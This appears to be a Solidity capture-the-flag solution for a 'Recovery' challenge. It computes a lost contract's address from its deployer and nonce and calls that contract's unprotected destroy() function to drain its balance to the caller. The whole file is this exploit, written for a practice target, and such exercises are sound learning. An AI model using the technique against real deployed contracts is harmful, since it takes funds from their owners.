// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract RecoveryAttack is Broadcasted {
    function attack(address payable recoveryCtr_) public payable override {
        // get the lost address
        address simpleTokenAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            recoveryCtr_,
                            uint8(0x01)
                        )
                    )
                )
            )
        );
        ISimpleToken(simpleTokenAddress).destroy(payable(tx.origin));
    }
}

interface ISimpleToken {
    // ! this is the method that should be called to drain the contract balance
    // ! the common way yo find the contract address is to look for a creation in the internal transactions
    // ! a workaround is to calculate the deterministic address calculated by the CREATE opcode
    // ! reference : https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed/761#761
    function destroy(address payable _to) external;
}
